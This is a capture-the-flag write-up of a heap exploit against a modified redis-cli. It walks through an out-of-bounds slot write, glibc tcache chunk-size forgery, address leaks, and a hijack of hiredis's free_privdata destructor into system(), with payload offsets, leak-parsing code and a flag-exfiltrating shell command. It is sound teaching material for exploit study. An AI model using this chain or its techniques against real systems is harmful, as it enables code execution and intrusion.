# redis-cli 0-day

**Category:** Pwn · **Points:** 176 · **Solves at capture:** 19 · **Flag:** `COMPFEST18{07db3141e603a471987956d7dfc4f58d266c6ab72c00491e65f18fe3de}`

---

## Challenge Description

> I wanted to reproduce the redis-cli 0-day that V12 found, but failed (kinda). Instead, let's exploit a different bug I found. Note: this redis-cli build is not default, see README.txt for the difference.

The challenge hands us a modified `redis-cli` binary and a remote service that launches it against a host and port of our choosing. We get to be the Redis server. The interesting twist is buried in a build flag: this binary was compiled with `MALLOC=libc` instead of Redis's default jemalloc, which makes the heap behavior deterministic in a way the exploit depends on heavily.

The actual launch command the challenge runs is:

```sh
./redis-cli \
  --user compfest \
  --pass redis_cli_0_day_wow! \
  --cluster info "$HOST" "$PORT" \
  < /dev/null > /dev/null 2>&1
```

Two things to notice: stdout and stderr go to `/dev/null`, so we cannot read anything the client prints. And the subcommand is `--cluster info`, not `--cluster check` — that matters later.

---

## Initial Analysis

The binary is a standard x86-64 ELF with all the expected modern protections:

```
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
FORTIFY:  Enabled
IBT/SHSTK: Present
```

Full RELRO rules out GOT overwrites. PIE and ASLR mean every address is randomized. We need a way to leak both heap and libc addresses before we can do anything with code execution.

The `README.txt` the organizers included points us directly to `clusterManagerNodeLoadInfo` in `redis-cli.c`. This function parses a `CLUSTER NODES` response and fills in a `clusterManagerNode` struct for each peer described in the response. That is the bug site.

Since we control the "Redis server" the client talks to, we control every byte of every `CLUSTER NODES` reply. The client parses our response and we can watch what it does with it.

---

## The Vulnerability / Core Concept

### The One-Byte-Write Primitive

The vulnerable code in `clusterManagerNodeLoadInfo` parses the hash slots section of a `CLUSTER NODES` line and marks each slot as owned:

```c
} else if (p > slotsdef) {
    node->slots[atoi(slotsdef)] = 1;
    node->slots_count++;
}
```

Valid Redis hash slots run from `0` to `16383`. There is no bounds check on `atoi(slotsdef)`. The `slots` array is at offset `0x54` inside `clusterManagerNode`, which has a total size of `0x4090` bytes.

So if we advertise a slot number `N`, the client executes:

```c
*(node_address + 0x54 + N) = 1;
```

That is our primitive: **one heap-relative write of the byte value `0x01` at an attacker-chosen positive offset from `node->slots`**. We cannot control the value — it is always `1`. We cannot write backwards — the index must be positive. But we can write anywhere ahead of the slots array on the heap, and we get to do it as many times as we want, once per slot number advertised per node.

### Why `MALLOC=libc` Matters

Redis normally allocates memory with jemalloc, which has its own completely different internal layout. By building with `MALLOC=libc`, the binary uses glibc's ptmalloc2 allocator instead. This means we get the tcache bins, the `main_arena` unsorted bin, chunk metadata fields — all the classic glibc heap exploitation primitives. The exploit leans on specific glibc chunk size behavior, tcache poisoning via chunk-size forgery, and the allocator's `free_privdata` destructor hook.

### The Code-Execution Gadget

hiredis (the Redis client library linked into `redis-cli`) calls an optional destructor when freeing a context:

```c
if (c->privdata && c->free_privdata)
    c->free_privdata(c->privdata);
```

If we can overlap a live `clusterManagerNode` with memory we control, we can point its `context` field at a fake `redisContext` where `free_privdata = system` and `privdata = "our command"`. When the node cleanup runs, we get `system("our command")`.

---

## Exploitation

### Step 0: The Setup

We run a Python fake-Redis server that speaks just enough RESP protocol to keep `redis-cli` happy:

- `AUTH` → `+OK`
- `INFO` → `cluster_enabled:1`
- `CLUSTER NODES` → our malicious node description
- `CLUSTER INFO` → `cluster_state:ok`
- `DBSIZE` → `:0` (normally)

When the client connects and asks for `CLUSTER NODES`, we return a response that describes several "friend" nodes. `redis-cli` then opens separate connections to each of those nodes, so our single server handles multiple sequential connections. This gives us multiple opportunities to send different payloads at different stages of the exploit.

### Step 1: Fix the Heap Layout

The first `CLUSTER NODES` reply comes from the "root" connection. We keep the response **exactly 907 bytes** — this is critical because the heap layout of everything that follows depends on how much memory the parser allocates for this first response. Change the length, change every offset.

Our root response describes several friend nodes and embeds these four OOB slot indices:

```
21132  21172  37717  71253
```

What each write does (offsets are relative to `node->slots` at `root + 0x54`):

| Slot index | Target field | Effect |
|---|---|---|
| `21132` | Low byte of F0's `ip` pointer | Redirects the IP to point into existing heap data |
| `21172` | F0's `flags` field | Changes `FRIEND` (4) to `MYSELF` (1), preventing the corrupted `ip` from being freed |
| `37717` | F0's flags-list malloc chunk size | Changes `0x41` → `0x141` (forges a larger chunk) |
| `71253` | F2's flags-list malloc chunk size | Changes `0x41` → `0x141` (same trick for a second donor) |

The chunk size forgery is the key trick. A glibc malloc chunk stores its size in the 8 bytes immediately before the data pointer. By flipping one byte from `0x41` to `0x141`, we lie to the allocator: it thinks this 64-byte allocation is actually a 320-byte chunk. When F0 is rejected and its storage freed, this forged `0x140` chunk enters the `0x140` tcache bin. The allocator will later hand it out when something requests a 320-byte allocation.

### Step 2: Heap Leak

F0 tries to connect to a port derived from the corrupted IP bytes. The connection attempt fails, and `redis-cli` logs the IP with `%s`. Because we redirected the IP pointer into existing heap data, those five printed bytes contain part of a heap pointer. We prepend the known low byte `0x30` and reconstruct the full address of `root + 0x42c0`, giving us the root node's address despite ASLR.

```python
disclosed = int.from_bytes(b"\x30" + raw_bytes, "little")
heap_base = disclosed - 0x42c0
```

### Step 3: Forged-Chunk Overlap for Libc Leak

F1 connects to our server and requests `CLUSTER NODES`. Its reply string allocation is `0x130` bytes, chunk size `0x140` — exactly the size of the forged chunk sitting in tcache. glibc returns the forged allocation, which overlaps F1's own `clusterManagerNode` starting 96 bytes (`0x60`) into our buffer.

We craft the overlap payload to:
1. Preserve F1's real malloc header (`0x40a1`) so cleanup doesn't abort
2. Zero out dangerous pointers (`context`, `name`)
3. Point F1's `ip` field at `root + 0x55a0` — a location in the heap that still holds a `main_arena` pointer from the unsorted bin

The response is intentionally not a valid `CLUSTER NODES` line, so parsing fails and `redis-cli` logs: `[ERR] Unable to load info for node <ip>`. That `<ip>` is the raw bytes of the arena pointer at `root + 0x55a0`.

```python
libc_base = arena_pointer - MAIN_ARENA_REMAINDER
system = libc_base + SYSTEM_OFFSET
```

### Step 4: Second Overlap for Code Execution

F2 similarly gets rejected, freeing its forged `0x140` flags-list chunk into tcache. F3's reply string allocation consumes it. F3's node begins `0xa0` bytes into the buffer.

This time we build a fake `redisContext` at `buffer + 0x20` and set:

```python
fake_context->privdata      = address_of_command_string
fake_context->free_privdata = system
```

The command string is embedded earlier in the buffer:

```python
command = b"cat /home/ctf/flag.txt >&5\x00"
data[0x30:0x30 + len(command)] = command
```

File descriptor 5 is D's live callback socket — that is how we receive the flag output despite stdout/stderr going to `/dev/null`.

We point F3's `context` field at the fake context. Then we send an invalid node reply, which triggers cleanup. `freeClusterManagerNode` calls `redisFree(fake_context)`, which executes:

```c
fake_context->free_privdata(fake_context->privdata);
// i.e.:
system("cat /home/ctf/flag.txt >&5");
```

The process crashes afterward because the fake context is not a real allocation, but by then the flag has already crossed the socket.

### The Remote Variant

The remote exploit (`remote_solve.py`) adapts the same chain for Ubuntu glibc 2.43 with a different heap layout. The key differences:

- Different arena offset (`MAIN_ARENA_REMAINDER = 0x212ad8` from the actual binary)
- Adjusted OOB indices for the glibc 2.43 layout
- Libc base detection using **frequency voting** instead of a fixed offset — TCP data can arrive fragmented, so the arena pointer appears at unpredictable byte positions in the leak. The robust approach scans every 8-byte window:

```python
votes = Counter()
for off in range(len(leak) - 7):
    q = u64(leak[off:off + 8])
    candidate = q - 0x212ad8
    if 0x700000000000 <= q < 0x800000000000:
        if candidate & 0xfff == 0:
            votes[candidate] += 1
libc = votes.most_common(1)[0][0]
```

The correct arena pointer appeared ~1,100 times in a 65 KB leak window, winning by a massive margin over noise.

- The remote leak comes from `DBSIZE` replies rather than connection error messages — because `--cluster info` triggers a `DBSIZE` round trip to every node after cluster loading completes, which `--cluster check` does not do.

---

## Key Commands / Payloads

**Root stage slot indices (local glibc 2.42):**
```
21132 21172 37717 71253
```

**Root stage slot indices (remote glibc 2.43):**
```
37157  (forge P's chunk size 0x41 → 0x141)
35844  (redirect D's obuf to fake SDS)
36621  (set SDS len byte 1)
36622  (set SDS len byte 2)
132    (set PREV_INUSE on synthetic following chunk)
```

**Code execution trigger — fake redisContext layout:**
```python
payload[0x60:0x68] = p64(fake_context_addr)   # node->context
payload[0x110:0x118] = p64(command_addr)       # fake->privdata
payload[0x118:0x120] = p64(system_addr)        # fake->free_privdata
```

**Run local exploit:**
```bash
chmod +x solve.py
./solve.py
test -e /tmp/PWNED && echo success
```

**Run remote exploit (against REMOTE_HOST:PORT):**
```bash
./remote_solve.py  # connects back; set PUBLIC_IP and PUBLIC_PORT for callback
```

---

## Flag

```
COMPFEST18{07db3141e603a471987956d7dfc4f58d266c6ab72c00491e65f18fe3de}
```

Remote output when it landed:

```
[*] CLUSTER NODES stage 1
[*] CLUSTER NODES stage 2
[*] CLUSTER NODES stage 3
[*] CLUSTER NODES stage 4
[*] received blind disclosure: 65810 bytes
[+] root=0x5bc9543b80b0 libc=0x7421bd4d9000 votes=1134 D.fd=5
[*] sending final overlap as D DBSIZE reply
[*] D/fd5 b'COMPFEST18{...}\n'
```

---

## Key Takeaways

**The primitive was weak but the impact was severe.** One byte, always `0x01`, only forward from `node->slots`. Most heap exploits want arbitrary values at arbitrary addresses. This challenge shows that even a highly restricted write — chosen offset, fixed value — can bootstrap into full code execution when you understand the allocator well enough. The trick was using it to forge chunk sizes, not to overwrite code pointers directly.

**Heap layout stability is everything.** The entire exploit depends on keeping the root `CLUSTER NODES` response exactly 907 bytes. One extra byte anywhere changes every subsequent allocation, invalidating all the carefully measured offsets. When adapting from the local glibc to the remote one, the response-length normalization code in `remote_solve.py` accounts for the fact that a real public IP + port string is longer than `127.0.0.1:6380`, and compensates by shrinking other fields.

**`MALLOC=libc` is a meaningful difference.** The author's note that this bug is probably not exploitable in a default Redis build is credible — jemalloc's internal layout and tcache behavior are completely different from glibc's. The tcache chunk-size forgery technique used here is fundamentally a glibc ptmalloc2 primitive.

**PTY vs pipe matters for staged exploits.** When `redis-cli` logs the libc leak to stdout, it's only visible before the next connection only if stdout is line-buffered. On a normal pipe stdout is fully buffered; the exploit driver might not see the disclosure in time to prepare the next response. Running the binary on a PTY (`pty.openpty()`) forces line buffering. Setting `TERM=dumb` prevents redis-cli from emitting ANSI color codes that would corrupt the raw pointer bytes being read.

**Frequency voting beats fixed offsets for large leaks.** When you're leaking 65 KB of heap and looking for a libc pointer at an unpredictable position, a fixed offset will break whenever TCP fragmentation changes. Voting on every aligned 8-byte window and picking the most frequent page-aligned candidate is robust and elegant.

**The `free_privdata` destructor in hiredis is a clean code-execution primitive.** Any time you can control a `redisContext` struct (or make the code think a buffer is one), `privdata` + `free_privdata` gives you a single-argument function call of your choice. Worth knowing for any challenge involving hiredis or the Redis client libraries.
